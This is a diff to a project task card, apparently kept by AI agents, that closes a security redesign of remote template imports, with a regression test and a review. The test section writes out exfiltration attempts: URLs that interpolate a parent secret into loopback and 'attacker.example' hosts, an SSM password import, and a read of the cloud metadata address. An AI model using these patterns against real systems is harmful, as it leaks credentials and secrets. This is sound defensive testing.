@@ -2,7 +2,7 @@
 :PROPERTIES:
 :CARD_ID:  C15
 :LANE:     main
-:TODO_STATE: STARTED
+:TODO_STATE: DONE
 :CARD_PRIORITY: A
 :MODE:     CONTRACT
 :ORIGIN:   C4 security review (notes/C4/report--security-review.org), accepted by the user 2026-11-16
@@ -17,6 +17,7 @@ CLOCK: [2026-11-16 Mon 18:33]--[2026-11-16 Mon 18:50] => 0:17
 CLOCK: [2026-11-16 Mon 18:53]--[2026-11-16 Mon 18:54] => 0:01
 CLOCK: [2026-11-16 Mon 19:02]--[2026-11-16 Mon 19:11] => 0:09
 CLOCK: [2026-11-16 Mon 19:16]--[2026-11-16 Mon 19:25] => 0:09
+CLOCK: [2026-11-16 Mon 19:31]--[2026-11-16 Mon 19:42] => 0:11
 :END:
 :LOGBOOK:
 - Card state TODO → STARTED [2026-11-16 Mon 16:11]
@@ -52,6 +53,16 @@ CLOCK: [2026-11-16 Mon 19:16]--[2026-11-16 Mon 19:25] => 0:09
 - Clock-out [2026-11-16 Mon 19:25]
   Agent: opus-5.5-medium
   Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
+- Clock-in [2026-11-16 Mon 19:31]
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
+- Clock-out [2026-11-16 Mon 19:42]
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
+- Card state STARTED → DONE [2026-11-16 Mon 19:45]
+  Note: Landed d6207c1..f6726c6 plus doc fix: imported documents isolated; requester-chain trust policy with --trust-import-source; AWS-backed imports and loopback/link-local/metadata HTTP blocked for untrusted chains; untrusted custom templates isolated; exfiltration regression test; docs and DIVERGENCES. Opus plan review, five Opus reviews (land)
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398
 :END:
 #+title: C15 — Redesign what remote templates may inherit and import
 #+date: 2026-11-16
@@ -127,31 +138,31 @@ Done when:
   literal address, a host name that resolves to a blocked address, and a
   public URL redirecting to =169.254.169.254=, plus the real resolver on
   numeric literals (=AI_NUMERICHOST=, no DNS).
-- [ ] =--trust-import-source PREFIX= is repeatable and validated at parse
+- [X] =--trust-import-source PREFIX= is repeatable and validated at parse
   time; documents under a listed prefix keep today's behaviour
   (AWS-backed imports, no address filter, parent variables for custom
   templates), each tested in the task that adds the restriction; a
   redirect from a trusted URL to a location outside the trusted prefixes
   is refused; tests cover parsing and prefix boundaries
   (=https://t.example.com/= does not trust =https://t.example.com.evil/=).
-- [ ] A test reproduces the C4 review's exfiltration scenario (parent
+- [X] A test reproduces the C4 review's exfiltration scenario (parent
   =$defs= secret, remote document with =ssm:= import and loopback and
   attacker URLs interpolating the secret) through the real dispatcher and
   shows each step blocked; recorded failing on the branch base.
-- [ ] The trust decision lives in one place, next to =isLocalBase= in
+- [X] The trust decision lives in one place, next to =isLocalBase= in
   =src/Iidy/Yaml/Imports/Types.hs=; the dispatcher, HTTP loader and engine
   call it and repeat no trust logic. =isAwsBacked= has one definition,
   used by the gate and by =GetImport.needsAwsEnv=. One helper builds the
   dispatcher and passes the same policy to the engine, and one
   =cfnImportConfig= builds =ImportConfig= from =CfnContext=.
-- [ ] New tests live in their own modules (trusted-source parsing, HTTP
+- [X] New tests live in their own modules (trusted-source parsing, HTTP
   guard) rather than growing =test/Test/ImportTrustTest.hs=.
-- [ ] =docs/SECURITY.org=, =docs/import-types.org=,
+- [X] =docs/SECURITY.org=, =docs/import-types.org=,
   =docs/custom-resource-templates.org=, =docs/command-reference.org= and
   the import-system and custom-resource requirements describe the model,
   including the residual risks listed in the docs task; =DIVERGENCES.md=
   has an entry for each departure from Rust.
-- [ ] Build warning-free, full suite green, each commit names C15.
+- [X] Build warning-free, full suite green, each commit names C15.
 
 Stop and record if: an existing fixture or test whose expected output came
 from Rust depends on an imported document seeing parent variables; the
@@ -1420,10 +1431,15 @@ Notes, not defects:
   =Params.mergeParams= (=Params.hs:206=). Merging them would shrink
   =Resolver.hs=; worth a separate card.
 
-* TODO Regression test for the C4 exfiltration scenario
+* DONE Regression test for the C4 exfiltration scenario
 :PROPERTIES:
 :ID: org:01a1e6fe-2be7-72bd-983a-90c787c0534a
 :ADDED: [2026-11-16 Mon 17:52]
+:END:
+:LOGBOOK:
+- State "DONE"       from "TODO" [2026-11-16 Mon 19:38] \\
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
 :END:
 A table-driven engine test in its own module (for example
 =test/Test/ExfiltrationTest.hs=; =runRender= builds its =ImportConfig=
@@ -1443,10 +1459,58 @@ secret. Run it on the
 branch base (or with the earlier commits reverted locally) and record the
 failure here.
 
-* TODO Document the model and record the divergences
+** Implementation 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e761-df0e-72c0-8f3d-6a8adf8a97c3
+:ADDED: [2026-11-16 Mon 19:41]
+:END:
+By worker claude-C15. New =test/Test/ExfiltrationTest.hs=: a local
+template with =$defs: {secret: s3cr3t}= imports
+=https://evil.example/t.yaml= (served by =stubDocsLoader=; the document
+carries its own =$defs=). One row per step, then all steps in one
+document: read the parent's secret as a variable; import
+=ssm:/prod/db/password=; =http://127.0.0.1:9/{{secret}}=;
+=http://169.254.169.254/latest/meta-data/=; =ssm:= then
+=http://attacker.example/{{s}}=. Every location the document requests
+goes through the real dispatcher with the mock AWS environment and the
+fake network. Each row asserts the preprocess fails, no AWS request was
+made, no blocked address was connected, and no request carried the
+secret or the SSM value. The attacker URLs use =http:= rather than the
+plan's =https://evil.example/{{s}}=, because =https:= would go to the
+real TLS connection, not the fake network.
+
+The fake network moved from =HttpGuardTest= to a shared module,
+=test/Test/FakeHttp.hs= (table-driven hosts with successive answers, and
+replies with a =*= path), used by both.
+
+Failing runs: recorded by switching off each guard in the current code,
+not against =827113a=: before C15 the HTTP loader had no seam, so the
+pre-C15 code would make real requests to =127.0.0.1=, the metadata
+address and the attacker host. Switches: isolation (the imported
+document starts from the parent's variables again), the AWS gate
+(=checkImport= never refuses an AWS-backed import), the HTTP filter
+(=httpGuardFor= never filters).
+#+begin_example
+all three off:  6 of 6 rows FAIL
+isolation off:  read the parent's secret ... FAIL (1 of 6)
+AWS gate off:   import ssm: ... FAIL; send an ssm: value to an attacker
+                URL FAIL; all steps in one document FAIL (3 of 6)
+HTTP filter off: send the parent's secret to a loopback service FAIL;
+                read the instance metadata service FAIL (2 of 6)
+#+end_example
+The loopback row with only isolation off still passes: the filter
+refuses =127.0.0.1= whatever the path holds (defence in depth); with
+only the filter off, isolation leaves =\{\{secret\}\}= unresolved.
+
+* DONE Document the model and record the divergences
 :PROPERTIES:
 :ID: org:01a1e6fe-2be7-72bd-983a-90c66884bb15
 :ADDED: [2026-11-16 Mon 17:52]
+:END:
+:LOGBOOK:
+- State "DONE"       from "TODO" [2026-11-16 Mon 19:42] \\
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a705648c00601743a
 :END:
 =docs/SECURITY.org=: rewrite "Overview", "Remote-Allowed Import Types",
 "Relative Import Behavior" (inheritance is not supported; see the
@@ -1502,3 +1566,119 @@ User-visible changes to state in the docs:
   metadata addresses, including through redirects.
 - =--trust-import-source PREFIX= restores the previous behaviour for
   listed sources.
+** Implementation 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e761-df0e-72c0-8f3d-6a89c236e4c6
+:ADDED: [2026-11-16 Mon 19:41]
+:END:
+By worker claude-C15.
+- =docs/SECURITY.org= rewritten: overview of trusted and untrusted
+  documents (requester chain), variable isolation, local-only,
+  AWS-backed and remote-allowed import types, the HTTP address filter,
+  redirects from a trusted source, =--trust-import-source= (prefix rules,
+  command line only, =iidy demo= pass-through), relative imports
+  (rejected from remote documents; the inheritance text corrected), base
+  paths, threat model and every remaining risk in this task's list
+  (including SOCKS), implementation notes.
+- =docs/import-types.org=: the =s3:=, =http(s)=, =cfn:=, =ssm:= and
+  =ssm-path:= notes, and the Security Restrictions section (the
+  relative-import inheritance text corrected).
+- =docs/custom-resource-templates.org=: a "Variables a template sees"
+  section, and the S3 and HTTP distribution bullets name the flag.
+- =docs/command-reference.org=: =--no-remote-imports= and
+  =--trust-import-source= rows in Global Options, and a paragraph on the
+  flag.
+- =docs/requirements/03-import-system.org=: overview, divergence list,
+  =checkImport= and the gates (including the HTTP guard and
+  =preprocessWithConfig=), merge semantics (empty start), US-03-006,
+  US-03-007, US-03-008, US-03-009, US-03-010 (criteria, base paths, edge
+  cases including the laundering chain, error scenarios) and US-03-012
+  (interpolation sees only the document's own variables); the
+  inheritance text around the old line 440 corrected.
+- =docs/requirements/04-custom-resources.org=: a "Variable Scope"
+  section, phase 5 and the US-04-001 / US-04-002 criteria. The old
+  claim that a name missing from =$params= resolves to an empty string
+  is replaced by the observed behaviour (a variable-not-found error, seen
+  in the task 6 runs).
+- =DIVERGENCES.md=: entries for the AWS-backed block, the HTTP address
+  filter (per-hop checks, HTTPS rebinding gap, proxy behaviour, unfiltered
+  ranges, SOCKS), custom-template isolation and =--trust-import-source=;
+  the C14 relative-import paragraph unchanged. Variable isolation is Rust
+  parity and has no entry.
+Not changed (outside this task's paths):
+=docs/requirements/01-cli-interface.org= lists =--no-remote-imports= but
+not the new flag.
+
+** Ready 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e762-84e3-754d-8d71-71c83a18833d
+:ADDED: [2026-11-16 Mon 19:42]
+:END:
+Rebased onto =38940f9= (no code changes since the hook runs). Commits:
+=bcf839d= (=preprocessText= takes the policy), =f9a0cfb= (task 7),
+=f6726c6= (task 8). Full suite through the pre-commit hook on the last
+commit: 2044 passed.
+
+** Final review 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e764-9f9d-7159-abe6-74a39d5d5f91
+:ADDED: [2026-11-16 Mon 19:44]
+:END:
+By the review worker. Branch =claude/C15= at =f6726c6=, base =38940f9=.
+
+Verdicts: =bcf839d= land (closes the task 6 defect: =preprocessText=
+takes the policy and runs =preprocessWithPolicy=); =f9a0cfb= land;
+=f6726c6= land. One low docs defect; any follow-up commit may carry it.
+fourmolu and hlint on the tip are clean.
+
+Checks run:
+- Exfiltration test (=test/Test/ExfiltrationTest.hs=): each row asserts
+  that the step fails, that the mock records no AWS request, that no
+  blocked address was connected, and that no request carries the secret
+  or the SSM value, which are the Done-when items. Spot check with the
+  HTTP address filter off (=hgFilterAddresses= forced false): "send the
+  parent's secret to a loopback service" and "read the instance metadata
+  service" FAIL (2 of 6); the other rows are blocked by isolation or the
+  AWS gate, as expected. Restored. The loopback row shows that an
+  undefined variable in an import location interpolates to empty text,
+  so that row is held by the filter, not by isolation.
+- Requirement 04 (missing name is a variable-not-found error): matches
+  the code. My task 6 revert runs showed "Variable not found: secret.
+  Available: p" for =!$expand= and "Custom resource expansion error:
+  Variable not found: secret" for resource-type use.
+- Docs against the reviewed code (=SECURITY.org=, =import-types.org=,
+  =custom-resource-templates.org=, =command-reference.org=, requirements
+  03 and 04, =DIVERGENCES.md=): the requester-chain rule, what
+  =--trust-import-source= restores (AWS-backed imports, unfiltered HTTP,
+  parent variables for custom templates) and what it does not (local-only
+  types), the prefix rules including the default-port rule, the address
+  list including =fd00:ec2::/32=, the redirect rule, proxy behaviour and
+  the requested URL deciding trust all match. Every residual risk from
+  my reviews is listed in =SECURITY.org= "Remaining Risks" and the
+  =DIVERGENCES.md= gaps: HTTPS rebinding, proxy resolution and the
+  unfiltered proxy address, no external DNS behind a proxy, SOCKS, the
+  unfiltered local and trusted HTTP (redirects included), the unfiltered
+  IPv6 forms, stdin, and locations built from remote values. Rust's
+  =reqwest= has only the =json= feature (=Cargo.toml:79=), so the SOCKS
+  parity claim holds. No counts in the changed docs (the removed
+  "Eleven", "Five" and "Six" counts are gone).
+
+Defect:
+1. Low (docs wording), =docs/SECURITY.org:137= ("Credential Theft") says
+   "Remote documents cannot read ... values read with the user's AWS
+   credentials". Documents under a trusted prefix can (that is the
+   flag's purpose). Fix: say "Untrusted documents" there; the
+   Exfiltration item at =:139= has the same "A remote document's
+   variables" wording and needs the same change.
+
+Notes, not defects:
+- The "all steps in one document" row stops at the first refused import
+  (=ssm:=), so it shows the combined document is blocked, not that every
+  later step is. The per-step rows carry that.
+- An undefined variable in an import location yields empty text
+  (standard Handlebars; a template body reports a variable-not-found
+  error instead), so
+  ="http://127.0.0.1:9/{{secret}}"= becomes a request to
+  =http://127.0.0.1:9/=. That is harmless after isolation, but a
+  strict-mode check would turn it into an error; worth a separate card if
+  wanted.
